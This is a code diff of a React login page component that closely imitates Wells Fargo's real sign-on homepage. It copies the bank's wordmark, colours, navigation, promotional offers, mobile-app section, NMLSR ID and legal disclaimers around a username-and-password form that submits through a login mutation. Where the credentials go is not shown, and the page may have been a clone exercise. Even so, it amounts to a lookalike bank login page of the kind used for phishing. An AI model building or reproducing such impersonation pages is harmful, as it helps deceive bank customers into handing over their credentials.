@@ -141,378 +141,353 @@ export default function LoginPage() {
 
   // Desktop Layout - CSS recreation of Wells Fargo website style
   const DesktopLayout = () => (
-    <div className="hidden lg:block min-h-screen bg-[#f5f5f5]">
-      {/* Top utility bar */}
-      <div className="bg-[#1a1a1a] text-white text-xs">
-        <div className="max-w-7xl mx-auto px-4 py-2 flex justify-between items-center">
-          <div className="flex items-center gap-6">
-            <span className="hover:underline cursor-pointer">Personal</span>
-            <span className="hover:underline cursor-pointer">Investing & Wealth Management</span>
-            <span className="hover:underline cursor-pointer">Small Business</span>
-            <span className="hover:underline cursor-pointer">Commercial Banking</span>
-            <span className="hover:underline cursor-pointer">Corporate & Investment Banking</span>
+    <div className="hidden lg:block min-h-screen bg-white">
+      {/* Top navigation bar - gray with category links */}
+      <div className="bg-[#f5f5f5] border-b border-gray-200">
+        <div className="max-w-7xl mx-auto px-6 py-2 flex justify-between items-center">
+          <div className="flex items-center gap-6 text-sm">
+            <span className="text-[#d71e28] font-semibold border-b-2 border-[#d71e28] pb-1 cursor-pointer">Personal</span>
+            <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer">Investing & Wealth Management</span>
+            <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer">Business</span>
+            <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer">Commercial Banking</span>
+            <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer">Corporate & Investment Banking</span>
+            <span className="text-gray-600 hover:text-[#d71e28] cursor-pointer">About Wells Fargo</span>
           </div>
-          <div className="flex items-center gap-4">
-            <span className="hover:underline cursor-pointer flex items-center gap-1">
-              <MapPin className="w-3 h-3" /> ATMs/Locations
-            </span>
-            <span className="hover:underline cursor-pointer flex items-center gap-1">
-              <Headphones className="w-3 h-3" /> Contact Us
-            </span>
-            <span className="hover:underline cursor-pointer">Español</span>
+          <div className="flex items-center gap-4 text-sm text-gray-600">
+            <span className="hover:text-[#d71e28] cursor-pointer">ATMs/Locations</span>
+            <span className="hover:text-[#d71e28] cursor-pointer">Help</span>
+            <span className="hover:text-[#d71e28] cursor-pointer">Español</span>
+            <Search className="w-4 h-4 cursor-pointer hover:text-[#d71e28]" />
           </div>
         </div>
       </div>
 
-      {/* Main header with logo */}
-      <header className="bg-[#d71e28] shadow-md">
-        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
-          {/* Wells Fargo Logo */}
-          <div className="flex items-center gap-2">
-            <div className="w-10 h-10 bg-[#ffcd41] rounded-full flex items-center justify-center">
-              <div className="text-[#d71e28] font-bold text-lg">W</div>
-            </div>
-            <div>
-              <div className="text-white font-bold text-xl tracking-wide" style={{ fontFamily: "Georgia, serif" }}>
-                WELLS FARGO
-              </div>
-              <div className="text-[#ffcd41] text-[10px] tracking-wider">Established 1852</div>
+      {/* Main header with Wells Fargo logo */}
+      <header className="bg-[#d71e28]">
+        <div className="max-w-7xl mx-auto px-6 py-2 flex items-center justify-between">
+          <div className="flex items-center gap-3">
+            <div className="text-white font-bold text-2xl tracking-wide" style={{ fontFamily: "Georgia, serif" }}>
+              WELLS FARGO
             </div>
           </div>
-
-          {/* Navigation */}
-          <nav className="flex items-center gap-6">
-            {[
-              { icon: CreditCard, label: "Credit Cards" },
-              { icon: Home, label: "Home Loans" },
-              { icon: Car, label: "Auto" },
-              { icon: PiggyBank, label: "Banking" },
-              { icon: TrendingUp, label: "Investing" },
-            ].map((item) => (
-              <button key={item.label} className="text-white flex items-center gap-1 hover:text-[#ffcd41] transition-colors text-sm">
-                <item.icon className="w-4 h-4" />
-                {item.label}
-                <ChevronDown className="w-3 h-3" />
+          <nav className="flex items-center gap-1 text-sm">
+            {["Checking", "Savings & CDs", "Credit Cards", "Home Loans", "Personal Loans", "Auto Loans", "Premier", "Education & Tools"].map((item) => (
+              <button key={item} className="text-white px-3 py-2 hover:bg-[#b91c23] rounded transition-colors">
+                {item}
               </button>
             ))}
           </nav>
-
-          {/* Search and Sign On */}
-          <div className="flex items-center gap-4">
-            <button className="text-white hover:text-[#ffcd41]">
-              <Search className="w-5 h-5" />
-            </button>
-            <Link href="/register" className="text-white text-sm hover:text-[#ffcd41]">
-              Enroll
-            </Link>
-          </div>
         </div>
       </header>
 
-      {/* Yellow accent line */}
-      <div className="h-1 bg-[#ffcd41]"></div>
-
-      {/* Hero Section with Sign On */}
-      <section className="bg-gradient-to-br from-[#8B0000] to-[#d71e28] relative overflow-hidden">
-        <div className="max-w-7xl mx-auto px-4 py-16 flex items-start justify-between">
-          {/* Left side - Hero content */}
-          <div className="flex-1 text-white pr-8">
-            <h1 className="text-5xl font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
+      {/* Main content area with login form and promo */}
+      <section className="bg-white border-b border-gray-200">
+        <div className="max-w-7xl mx-auto px-6 py-8 flex gap-12">
+          {/* Left side - Sign On Form */}
+          <div className="w-[280px] flex-shrink-0">
+            <h2 className="text-xl text-gray-800 mb-1" style={{ fontFamily: "Georgia, serif" }}>
               {greeting}
-            </h1>
-            <p className="text-xl mb-8 opacity-90">
-              Sign on to manage your accounts.
-            </p>
-            <div className="flex gap-4 mt-8">
-              <div className="bg-white/10 backdrop-blur rounded-lg p-6 w-64">
-                <CreditCard className="w-8 h-8 text-[#ffcd41] mb-3" />
-                <h3 className="text-lg font-semibold mb-2">Active Cash Card</h3>
-                <p className="text-sm opacity-80">Earn unlimited 2% cash rewards on purchases.</p>
-              </div>
-              <div className="bg-white/10 backdrop-blur rounded-lg p-6 w-64">
-                <PiggyBank className="w-8 h-8 text-[#ffcd41] mb-3" />
-                <h3 className="text-lg font-semibold mb-2">Way2Save Savings</h3>
-                <p className="text-sm opacity-80">Build your savings automatically with each purchase.</p>
-              </div>
-            </div>
-          </div>
-
-          {/* Right side - Sign On Form */}
-          <div className="w-[340px] bg-white rounded-lg shadow-xl p-6">
-            <h2 className="text-2xl text-[#1a1a1a] mb-1" style={{ fontFamily: "Georgia, serif" }}>
-              Sign On
             </h2>
-            <p className="text-sm text-gray-600 mb-4">to access your accounts</p>
+            <p className="text-sm text-gray-600 mb-4">Sign on to manage your accounts.</p>
 
-            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
+            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-3">
               <div>
+                <label className="text-xs text-gray-600 block mb-1">Username</label>
                 <input
                   {...form.register("username", { required: true })}
-                  placeholder="Username"
                   autoComplete="username"
                   autoCapitalize="off"
                   autoCorrect="off"
                   spellCheck={false}
-                  className="flex h-12 w-full px-4 text-base border-2 border-gray-300 rounded focus:border-[#d71e28] focus:outline-none bg-white"
+                  className="flex h-10 w-full px-3 text-sm border border-gray-300 rounded focus:border-[#d71e28] focus:outline-none focus:ring-1 focus:ring-[#d71e28] bg-white"
                   data-testid="desktop-input-username"
                 />
               </div>
 
-              <div className="relative">
+              <div>
+                <div className="flex justify-between items-center mb-1">
+                  <label className="text-xs text-gray-600">Password</label>
+                  <button
+                    type="button"
+                    onMouseDown={(e) => e.preventDefault()}
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="text-[#0066b2] text-xs hover:underline"
+                  >
+                    {showPassword ? "Hide" : "Show"}
+                  </button>
+                </div>
                 <input
                   {...form.register("password", { required: true })}
                   type={showPassword ? "text" : "password"}
-                  placeholder="Password"
                   autoComplete="current-password"
-                  className="flex h-12 w-full px-4 pr-16 text-base border-2 border-gray-300 rounded focus:border-[#d71e28] focus:outline-none bg-white"
+                  className="flex h-10 w-full px-3 text-sm border border-gray-300 rounded focus:border-[#d71e28] focus:outline-none focus:ring-1 focus:ring-[#d71e28] bg-white"
                   data-testid="desktop-input-password"
                 />
-                <button
-                  type="button"
-                  onMouseDown={(e) => e.preventDefault()}
-                  onClick={() => setShowPassword(!showPassword)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium text-sm underline"
-                >
-                  {showPassword ? "Hide" : "Show"}
-                </button>
               </div>
 
-              <Button
-                type="submit"
-                className="w-full h-12 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded text-base"
-                disabled={loginMutation.isPending}
-                data-testid="desktop-button-sign-on"
-              >
-                {loginMutation.isPending ? "Signing on..." : "Sign On"}
-              </Button>
+              <div className="flex items-center gap-2">
+                <input type="checkbox" id="saveUsername" className="w-4 h-4 accent-[#d71e28]" />
+                <label htmlFor="saveUsername" className="text-xs text-gray-600">Save username</label>
+              </div>
+
+              <div className="flex gap-2 pt-1">
+                <Button
+                  type="submit"
+                  className="flex-1 h-9 bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold rounded text-sm"
+                  disabled={loginMutation.isPending}
+                  data-testid="desktop-button-sign-on"
+                >
+                  {loginMutation.isPending ? "..." : "Sign On"}
+                </Button>
+                <Link href="/register">
+                  <Button
+                    type="button"
+                    variant="outline"
+                    className="h-9 px-4 border-gray-400 text-gray-700 font-semibold rounded text-sm hover:bg-gray-50"
+                  >
+                    Enroll
+                  </Button>
+                </Link>
+              </div>
             </form>
 
-            <div className="flex items-center justify-center gap-2 py-2">
-              <span className="text-gray-400 text-sm">or</span>
+            <div className="mt-3 space-y-1 text-xs">
+              <Link href="/forgot-password" className="text-[#0066b2] hover:underline block">
+                Forgot username or password?
+              </Link>
+              <Link href="/security" className="text-[#0066b2] hover:underline block">
+                Security Center
+              </Link>
+              <span className="text-[#0066b2] hover:underline cursor-pointer block">
+                Privacy, Cookies, and Legal
+              </span>
             </div>
+          </div>
 
-            <Button
-              type="button"
-              variant="outline"
-              className="w-full h-12 rounded border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold text-base hover:bg-gray-50"
-              onClick={handleBiometricLogin}
-              disabled={biometricLoading}
-              data-testid="desktop-button-passkey"
-            >
-              <User className="w-5 h-5 mr-2" />
-              {biometricLoading ? "Verifying Face ID..." : "Use Face ID or passkey"}
-            </Button>
-
-            <div className="mt-4 pt-4 border-t border-gray-200 space-y-2">
-              <Link href="/forgot-password" className="text-[#6b21a8] text-sm hover:underline flex items-center gap-1">
-                <ArrowRight className="w-3 h-3" /> Forgot username or password?
-              </Link>
-              <Link href="/security" className="text-[#6b21a8] text-sm hover:underline flex items-center gap-1">
-                <ArrowRight className="w-3 h-3" /> Security Center
-              </Link>
+          {/* Right side - Promotional content */}
+          <div className="flex-1 flex gap-8">
+            {/* Main promo */}
+            <div className="flex-1">
+              <div className="flex items-start gap-6">
+                <div className="flex-1">
+                  <h1 className="text-3xl text-gray-800 font-light mb-3" style={{ fontFamily: "Georgia, serif" }}>
+                    $325 checking bonus on us
+                  </h1>
+                  <p className="text-sm text-gray-600 mb-4 leading-relaxed">
+                    New customers open an eligible checking account with qualifying direct deposits.
+                  </p>
+                  <button className="bg-[#1a1a1a] text-white px-5 py-2 rounded text-sm font-semibold hover:bg-black transition-colors">
+                    Get started
+                  </button>
+                </div>
+                <div className="w-48 h-32 bg-gradient-to-br from-pink-100 to-pink-200 rounded-lg flex items-center justify-center overflow-hidden">
+                  <div className="text-center">
+                    <div className="text-xs text-gray-500">Enjoy</div>
+                    <div className="text-4xl font-bold text-[#d71e28]">$325</div>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
         </div>
-
-        {/* Decorative wave */}
-        <div className="absolute bottom-0 left-0 right-0 h-16 bg-[#f5f5f5]" style={{
-          clipPath: "ellipse(60% 100% at 50% 100%)"
-        }}></div>
       </section>
 
-      {/* Special Offers Section */}
-      <section className="bg-[#f5f5f5] py-12">
-        <div className="max-w-7xl mx-auto px-4">
-          <h2 className="text-3xl text-[#1a1a1a] mb-8" style={{ fontFamily: "Georgia, serif" }}>
-            Special offers for you
+      {/* Three promo cards */}
+      <section className="bg-white py-8 border-b border-gray-200">
+        <div className="max-w-7xl mx-auto px-6">
+          <div className="grid grid-cols-3 gap-6">
+            <div className="flex items-start gap-4 p-4 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
+              <div className="w-12 h-12 bg-[#d71e28] rounded-full flex items-center justify-center flex-shrink-0">
+                <CreditCard className="w-6 h-6 text-white" />
+              </div>
+              <div>
+                <h3 className="font-semibold text-gray-800 mb-1">Earn a $200 cash rewards bonus</h3>
+                <p className="text-xs text-gray-600 mb-2">Plus, earn unlimited 2% cash rewards on purchases with $0 annual fee. Terms apply.</p>
+                <span className="text-[#0066b2] text-xs hover:underline">Learn more</span>
+              </div>
+            </div>
+            <div className="flex items-start gap-4 p-4 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
+              <div className="w-12 h-12 bg-[#0066b2] rounded-full flex items-center justify-center flex-shrink-0">
+                <Users className="w-6 h-6 text-white" />
+              </div>
+              <div>
+                <h3 className="font-semibold text-gray-800 mb-1">New customer? Say hello to a $125 bonus</h3>
+                <p className="text-xs text-gray-600 mb-2">Open a Clear Access Banking account, great for students & more, complete offer requirements.</p>
+                <span className="text-[#0066b2] text-xs hover:underline">See offer details</span>
+              </div>
+            </div>
+            <div className="flex items-start gap-4 p-4 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
+              <div className="w-12 h-12 bg-white border-2 border-gray-300 rounded-full flex items-center justify-center flex-shrink-0">
+                <TrendingUp className="w-6 h-6 text-[#d71e28]" />
+              </div>
+              <div>
+                <div className="flex items-center gap-2 mb-1">
+                  <span className="text-xs text-gray-500">Interest rates today</span>
+                  <span className="bg-[#d71e28] text-white text-xs px-2 py-0.5 rounded">%</span>
+                </div>
+                <h3 className="font-semibold text-gray-800 mb-1">Open a savings account</h3>
+                <p className="text-xs text-gray-600 mb-2">Explore our savings accounts and find the right fit for you.</p>
+                <span className="text-[#0066b2] text-xs hover:underline">Get started</span>
+                <span className="text-gray-400 mx-2">|</span>
+                <span className="text-[#0066b2] text-xs hover:underline">Check rates</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Home mortgage section with image */}
+      <section className="bg-[#f8f8f8] py-10">
+        <div className="max-w-7xl mx-auto px-6">
+          <div className="bg-white rounded-lg shadow-sm overflow-hidden flex">
+            <div className="w-1/2 bg-gradient-to-br from-green-800 to-green-900 p-10 flex flex-col justify-center">
+              <h2 className="text-3xl text-white font-light mb-4" style={{ fontFamily: "Georgia, serif" }}>
+                A home of your own
+              </h2>
+              <p className="text-white/80 mb-6">
+                With low down payment options on a fixed-rate mortgage.
+              </p>
+              <button className="bg-[#1a1a1a] text-white px-5 py-2 rounded text-sm font-semibold w-fit hover:bg-black transition-colors">
+                Get started
+              </button>
+            </div>
+            <div className="w-1/2 bg-gradient-to-br from-green-100 to-green-200 flex items-center justify-center">
+              <Home className="w-32 h-32 text-green-700 opacity-50" />
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Financial guidance and support */}
+      <section className="bg-white py-12">
+        <div className="max-w-7xl mx-auto px-6">
+          <h2 className="text-2xl text-gray-800 mb-8 text-center" style={{ fontFamily: "Georgia, serif" }}>
+            Financial guidance and support
           </h2>
           <div className="grid grid-cols-3 gap-6">
-            <div className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
-              <div className="h-40 bg-gradient-to-br from-[#1a4d2e] to-[#2d7a4a] flex items-center justify-center">
-                <CreditCard className="w-16 h-16 text-white" />
+            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
+              <div className="w-full h-40 bg-gradient-to-br from-yellow-100 to-orange-100 rounded-lg mb-4 flex items-center justify-center">
+                <PiggyBank className="w-16 h-16 text-yellow-600" />
               </div>
-              <div className="p-6">
-                <h3 className="text-lg font-semibold text-[#1a1a1a] mb-2">Active Cash Card</h3>
-                <p className="text-sm text-gray-600 mb-4">Earn unlimited 2% cash rewards on purchases. No annual fee.</p>
-                <button className="text-[#d71e28] font-semibold text-sm hover:underline">Learn more</button>
-              </div>
-            </div>
-            <div className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
-              <div className="h-40 bg-gradient-to-br from-[#0d3b66] to-[#1a5f9e] flex items-center justify-center">
-                <Home className="w-16 h-16 text-white" />
-              </div>
-              <div className="p-6">
-                <h3 className="text-lg font-semibold text-[#1a1a1a] mb-2">Home Mortgage</h3>
-                <p className="text-sm text-gray-600 mb-4">Get pre-approved in minutes. Competitive rates available.</p>
-                <button className="text-[#d71e28] font-semibold text-sm hover:underline">Get started</button>
-              </div>
-            </div>
-            <div className="bg-white rounded-lg shadow-md overflow-hidden hover:shadow-lg transition-shadow">
-              <div className="h-40 bg-gradient-to-br from-[#4a1c6b] to-[#7b2d9e] flex items-center justify-center">
-                <TrendingUp className="w-16 h-16 text-white" />
-              </div>
-              <div className="p-6">
-                <h3 className="text-lg font-semibold text-[#1a1a1a] mb-2">Invest with us</h3>
-                <p className="text-sm text-gray-600 mb-4">Build your portfolio with expert guidance and tools.</p>
-                <button className="text-[#d71e28] font-semibold text-sm hover:underline">Explore options</button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      {/* Savings Section */}
-      <section className="bg-white py-12">
-        <div className="max-w-7xl mx-auto px-4 flex items-center gap-12">
-          <div className="flex-1">
-            <div className="text-[#d71e28] text-sm font-semibold mb-2">SAVINGS</div>
-            <h2 className="text-3xl text-[#1a1a1a] mb-4" style={{ fontFamily: "Georgia, serif" }}>
-              Grow your savings with competitive rates
-            </h2>
-            <p className="text-gray-600 mb-6">
-              Open a savings account and start building toward your goals. Earn interest on your balance with no minimum deposit required.
-            </p>
-            <button className="bg-[#d71e28] hover:bg-[#b91c23] text-white font-semibold px-6 py-3 rounded">
-              Open an account
-            </button>
-          </div>
-          <div className="w-96 h-64 bg-gradient-to-br from-[#ffcd41] to-[#e6b938] rounded-lg flex items-center justify-center">
-            <PiggyBank className="w-32 h-32 text-white" />
-          </div>
-        </div>
-      </section>
-
-      {/* Financial Guidance Section */}
-      <section className="bg-[#1a1a1a] py-12 text-white">
-        <div className="max-w-7xl mx-auto px-4">
-          <h2 className="text-3xl mb-8" style={{ fontFamily: "Georgia, serif" }}>
-            Financial guidance for every stage of life
-          </h2>
-          <div className="grid grid-cols-4 gap-6">
-            {[
-              { icon: Shield, title: "Security Center", desc: "Protect your accounts" },
-              { icon: Users, title: "Family Banking", desc: "Teach kids about money" },
-              { icon: Building2, title: "Small Business", desc: "Grow your business" },
-              { icon: TrendingUp, title: "Retirement", desc: "Plan for the future" },
-            ].map((item) => (
-              <div key={item.title} className="bg-white/10 rounded-lg p-6 hover:bg-white/20 transition-colors cursor-pointer">
-                <item.icon className="w-10 h-10 text-[#ffcd41] mb-4" />
-                <h3 className="text-lg font-semibold mb-2">{item.title}</h3>
-                <p className="text-sm opacity-80">{item.desc}</p>
-              </div>
-            ))}
-          </div>
-        </div>
-      </section>
-
-      {/* Mobile App Section */}
-      <section className="bg-[#f5f5f5] py-12">
-        <div className="max-w-7xl mx-auto px-4 flex items-center gap-12">
-          <div className="w-64 h-96 bg-gradient-to-b from-[#d71e28] to-[#8B0000] rounded-3xl flex items-center justify-center shadow-xl">
-            <Smartphone className="w-24 h-24 text-white" />
-          </div>
-          <div className="flex-1">
-            <div className="text-[#d71e28] text-sm font-semibold mb-2">WELLS FARGO MOBILE</div>
-            <h2 className="text-3xl text-[#1a1a1a] mb-4" style={{ fontFamily: "Georgia, serif" }}>
-              Bank anytime, anywhere
-            </h2>
-            <p className="text-gray-600 mb-6">
-              Manage your accounts, pay bills, transfer money, and deposit checks right from your phone.
-            </p>
-            <div className="flex gap-4">
-              <button className="bg-[#1a1a1a] text-white px-6 py-3 rounded font-semibold">
-                App Store
+              <h3 className="font-semibold text-gray-800 mb-2">Savings you can count on</h3>
+              <p className="text-xs text-gray-600 mb-3">Discover how smart saving moves you closer to your goals.</p>
+              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
+                Grow your savings
               </button>
-              <button className="bg-[#1a1a1a] text-white px-6 py-3 rounded font-semibold">
-                Google Play
+            </div>
+            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
+              <div className="w-full h-40 bg-gradient-to-br from-blue-100 to-indigo-100 rounded-lg mb-4 flex items-center justify-center">
+                <TrendingUp className="w-16 h-16 text-blue-600" />
+              </div>
+              <h3 className="font-semibold text-gray-800 mb-2">Trendlines over headlines</h3>
+              <p className="text-xs text-gray-600 mb-3">Our forecasts and potential investment opportunities for the coming year.</p>
+              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
+                Get the 2026 Outlook
+              </button>
+            </div>
+            <div className="text-center p-6 hover:bg-gray-50 rounded-lg cursor-pointer transition-colors">
+              <div className="w-full h-40 bg-[#d71e28] rounded-lg mb-4 flex items-center justify-center">
+                <div className="text-white text-center">
+                  <Shield className="w-10 h-10 mx-auto mb-2" />
+                  <div className="font-bold">Fraud &</div>
+                  <div className="font-bold">Scam Alert</div>
+                </div>
+              </div>
+              <h3 className="font-semibold text-gray-800 mb-2">Your shield against scams</h3>
+              <p className="text-xs text-gray-600 mb-3">Spot the latest tactics scammers are using.</p>
+              <button className="border border-gray-300 text-gray-700 px-4 py-2 rounded text-xs font-semibold hover:bg-gray-100 transition-colors">
+                Get the latest
               </button>
             </div>
           </div>
         </div>
       </section>
 
-      {/* Community Section */}
+      {/* Ask Fargo Mobile App Section */}
+      <section className="bg-[#f8f8f8] py-10">
+        <div className="max-w-7xl mx-auto px-6">
+          <div className="bg-white rounded-lg shadow-sm p-8 flex items-center gap-8">
+            <div className="w-48 flex-shrink-0">
+              <div className="bg-gradient-to-b from-[#d71e28] to-[#8B0000] rounded-2xl p-4 shadow-lg">
+                <div className="bg-white rounded-xl p-3">
+                  <div className="text-[#d71e28] font-bold text-sm mb-1">Fargo</div>
+                  <div className="text-xs text-gray-600">Here are insights into your spending</div>
+                  <div className="mt-2 flex gap-1">
+                    <div className="w-2 h-8 bg-[#d71e28] rounded"></div>
+                    <div className="w-2 h-6 bg-[#ffcd41] rounded"></div>
+                    <div className="w-2 h-10 bg-[#d71e28] rounded"></div>
+                    <div className="w-2 h-4 bg-[#ffcd41] rounded"></div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div className="flex-1">
+              <h2 className="text-2xl text-gray-800 mb-3" style={{ fontFamily: "Georgia, serif" }}>
+                Need help? Ask Fargo<sup>®</sup>
+              </h2>
+              <p className="text-sm text-gray-600 mb-4 leading-relaxed">
+                Fargo<sup>®</sup> gives you valuable insights like a summary of your spending by category, retailer and across accounts. Find it only in the Wells Fargo Mobile<sup>®</sup> app.
+              </p>
+              <div className="flex gap-3">
+                <button className="bg-black text-white px-4 py-2 rounded text-xs font-semibold flex items-center gap-2">
+                  <Smartphone className="w-4 h-4" /> App Store
+                </button>
+                <button className="bg-black text-white px-4 py-2 rounded text-xs font-semibold flex items-center gap-2">
+                  <Smartphone className="w-4 h-4" /> Google Play
+                </button>
+              </div>
+              <p className="text-xs text-gray-400 mt-3">*Screen image is simulated</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      {/* Serving our customers section */}
       <section className="bg-white py-12">
-        <div className="max-w-7xl mx-auto px-4 text-center">
-          <h2 className="text-3xl text-[#1a1a1a] mb-4" style={{ fontFamily: "Georgia, serif" }}>
-            Committed to our communities
+        <div className="max-w-7xl mx-auto px-6 text-center">
+          <h2 className="text-2xl text-gray-800 mb-4" style={{ fontFamily: "Georgia, serif" }}>
+            Serving our customers and communities
           </h2>
-          <p className="text-gray-600 mb-8 max-w-2xl mx-auto">
-            We're dedicated to helping communities thrive through financial education, affordable housing, and small business support.
+          <p className="text-sm text-gray-600 max-w-3xl mx-auto mb-8">
+            It doesn't happen with one transaction, in one day on the job, or in one quarter. It's earned relationship by relationship.
           </p>
-          <button className="border-2 border-[#d71e28] text-[#d71e28] font-semibold px-6 py-3 rounded hover:bg-[#d71e28] hover:text-white transition-colors">
-            Learn about our impact
-          </button>
+          <div className="grid grid-cols-2 gap-8 max-w-4xl mx-auto">
+            <div className="bg-[#d71e28] rounded-lg p-6 text-left text-white">
+              <div className="text-white font-bold text-lg mb-2" style={{ fontFamily: "Georgia, serif" }}>WELLS FARGO</div>
+              <h3 className="font-semibold mb-2">Who we are</h3>
+              <p className="text-sm opacity-90 mb-4">Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.</p>
+              <button className="text-white text-sm underline hover:no-underline">About Wells Fargo</button>
+            </div>
+            <div className="bg-gradient-to-br from-teal-600 to-teal-700 rounded-lg p-6 text-left text-white">
+              <h3 className="font-semibold mb-2">Why we're committed to communities</h3>
+              <p className="text-sm opacity-90 mb-4">We don't just serve our communities—we are our communities. We're committed to helping customers and neighborhoods across the country thrive.</p>
+              <button className="border border-white text-white px-4 py-2 rounded text-sm font-semibold hover:bg-white hover:text-teal-700 transition-colors">
+                Wells Fargo Stories
+              </button>
+            </div>
+          </div>
         </div>
       </section>
 
       {/* Desktop Footer */}
-      <footer className="bg-[#1a1a1a] text-white py-12">
-        <div className="max-w-7xl mx-auto px-4">
-          <div className="grid grid-cols-5 gap-8 mb-8">
-            <div>
-              <h4 className="font-semibold mb-4">About Wells Fargo</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li className="hover:text-white cursor-pointer">Careers</li>
-                <li className="hover:text-white cursor-pointer">Investor Relations</li>
-                <li className="hover:text-white cursor-pointer">Newsroom</li>
-                <li className="hover:text-white cursor-pointer">Who We Are</li>
-              </ul>
+      <footer className="bg-[#f5f5f5] border-t border-gray-200 py-8">
+        <div className="max-w-7xl mx-auto px-6">
+          <div className="flex justify-between items-center text-xs text-gray-500 mb-4">
+            <div className="flex gap-4">
+              <span className="hover:text-[#d71e28] cursor-pointer">Privacy Policy</span>
+              <span className="hover:text-[#d71e28] cursor-pointer">Terms of Use</span>
+              <span className="hover:text-[#d71e28] cursor-pointer">Report Fraud</span>
+              <span className="hover:text-[#d71e28] cursor-pointer">Security</span>
+              <span className="hover:text-[#d71e28] cursor-pointer">Accessibility</span>
+              <span className="hover:text-[#d71e28] cursor-pointer">Sitemap</span>
             </div>
             <div>
-              <h4 className="font-semibold mb-4">Banking</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li className="hover:text-white cursor-pointer">Checking</li>
-                <li className="hover:text-white cursor-pointer">Savings</li>
-                <li className="hover:text-white cursor-pointer">CDs</li>
-                <li className="hover:text-white cursor-pointer">Money Market</li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold mb-4">Credit Cards</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li className="hover:text-white cursor-pointer">Cash Back</li>
-                <li className="hover:text-white cursor-pointer">Rewards</li>
-                <li className="hover:text-white cursor-pointer">Low Interest</li>
-                <li className="hover:text-white cursor-pointer">Business</li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold mb-4">Loans</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li className="hover:text-white cursor-pointer">Home Loans</li>
-                <li className="hover:text-white cursor-pointer">Auto Loans</li>
-                <li className="hover:text-white cursor-pointer">Personal Loans</li>
-                <li className="hover:text-white cursor-pointer">Student Loans</li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-semibold mb-4">Help</h4>
-              <ul className="space-y-2 text-sm text-gray-400">
-                <li className="hover:text-white cursor-pointer">FAQs</li>
-                <li className="hover:text-white cursor-pointer">Contact Us</li>
-                <li className="hover:text-white cursor-pointer">Security Center</li>
-                <li className="hover:text-white cursor-pointer">Report Fraud</li>
-              </ul>
+              © 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
             </div>
           </div>
-          <div className="border-t border-gray-700 pt-8">
-            <div className="flex justify-between items-center text-xs text-gray-400">
-              <div className="flex gap-4">
-                <span className="hover:text-white cursor-pointer">Privacy Policy</span>
-                <span className="hover:text-white cursor-pointer">Terms of Use</span>
-                <span className="hover:text-white cursor-pointer">Report Fraud</span>
-                <span className="hover:text-white cursor-pointer">Security</span>
-                <span className="hover:text-white cursor-pointer">Accessibility</span>
-              </div>
-              <div>
-                © 2024 Wells Fargo. All rights reserved. NMLSR ID 399801
-              </div>
-            </div>
-            <p className="text-xs text-gray-500 mt-4">
-              Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
-            </p>
-          </div>
+          <p className="text-xs text-gray-400">
+            Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested
+          </p>
         </div>
       </footer>
     </div>
